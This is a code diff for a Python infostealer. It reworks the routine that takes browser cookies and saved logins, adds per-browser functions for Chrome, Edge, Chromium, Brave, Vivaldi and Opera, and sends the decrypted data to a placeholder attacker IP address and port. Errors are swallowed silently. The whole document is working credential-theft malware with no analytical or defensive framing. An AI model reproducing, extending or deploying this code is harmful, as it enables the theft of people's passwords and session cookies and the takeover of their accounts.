@@ -24,12 +24,84 @@ def send_error(sent):
 
 
 def send_robber(login_directory, cookie_directory, encryption_key):
-    if cookies_bool:
-        cookies = steal.get_cookies(cookie_directory, encryption_key)
-        send_data(url, "cookies", cookies)
-    if login_bool:
-        logins = steal.get_logins(login_directory, encryption_key)
-        send_data(url, "logins", logins)
+    try:
+        if cookies_bool:
+            cookies = steal.get_cookies(cookie_directory, encryption_key)
+            send_data(url, "cookies", cookies)
+        if login_bool:
+            logins = steal.get_logins(login_directory, encryption_key)
+            send_data(url, "logins", logins)
+    except:
+        pass
+
+
+def get_chrome():
+    try:
+        if steal.chrome_exists():
+            key_directory, cookie_directory, login_directory = steal.get_chrome_directories()
+            encryption_key = steal.get_encryption_key(key_directory)
+            send_robber(login_directory, cookie_directory, encryption_key)
+    except:
+        pass
+
+
+def get_vivaldi():
+    try:
+        if steal.vivaldi_exists():
+            key_directory, cookie_directory, login_directory = steal.get_vivaldi_directories()
+            encryption_key = steal.get_encryption_key(key_directory)
+            send_robber(login_directory, cookie_directory, encryption_key)
+    except:
+        pass
+
+
+def get_edge():
+    try:
+        if steal.edge_exists():
+            key_directory, cookie_directory, login_directory = steal.get_edge_directories()
+            encryption_key = steal.get_encryption_key(key_directory)
+            send_robber(login_directory, cookie_directory, encryption_key)
+    except:
+        pass
+
+
+def get_brave():
+    try:
+        if steal.brave_exists():
+            key_directory, cookie_directory, login_directory = steal.get_brave_directories()
+            encryption_key = steal.get_encryption_key(key_directory)
+            send_robber(login_directory, cookie_directory, encryption_key)
+    except:
+        pass
+
+
+def get_chromium():
+    try:
+        if steal.chromnium_exists():
+            key_directory, cookie_directory, login_directory = steal.get_chromium_directories()
+            encryption_key = steal.get_encryption_key(key_directory)
+            send_robber(login_directory, cookie_directory, encryption_key)
+    except:
+        pass
+
+
+def get_opera():
+    try:
+        if steal.opera_exists():
+            key_directory, cookie_directory, login_directory = steal.get_opera_directories()
+            encryption_key = steal.get_encryption_key(key_directory)
+            send_robber(login_directory, cookie_directory, encryption_key)
+    except:
+        pass
+
+
+def get_browsers():
+    get_chrome()
+    get_edge()
+    get_chromium()
+    get_brave()
+    get_vivaldi()
+    get_opera()
 
 
 if __name__ == "__main__":
@@ -39,28 +111,7 @@ if __name__ == "__main__":
             ip_address = socket.gethostbyname("<<IP_ADDRESS>>")
             port = <<PORT>>
             url = f"http://{ip_address}:{port}"
-
-            if steal.chrome_exists():
-                key_directory, cookie_directory, login_directory = steal.get_chrome_directories()
-                encryption_key = steal.get_encryption_key(key_directory)
-                send_robber(login_directory, cookie_directory, encryption_key)
-            if steal.edge_exists():
-                key_directory, cookie_directory, login_directory = steal.get_edge_directories()
-                encryption_key = steal.get_encryption_key(key_directory)
-                send_robber(login_directory, cookie_directory, encryption_key)
-            if steal.chromnium_exists():
-                key_directory, cookie_directory, login_directory = steal.get_chromium_directories()
-                encryption_key = steal.get_encryption_key(key_directory)
-                send_robber(login_directory, cookie_directory, encryption_key)
-            if steal.brave_exists():
-                key_directory, cookie_directory, login_directory = steal.get_brave_directories()
-                encryption_key = steal.get_encryption_key(key_directory)
-                send_robber(login_directory, cookie_directory, encryption_key)
-            if steal.vivaldi_exists():
-                key_directory, cookie_directory, login_directory = steal.get_vivaldi_directories()
-                encryption_key = steal.get_encryption_key(key_directory)
-                send_robber(login_directory, cookie_directory, encryption_key)
-
+            get_browsers()
             send_error(sent)
             break
         except FileNotFoundError:
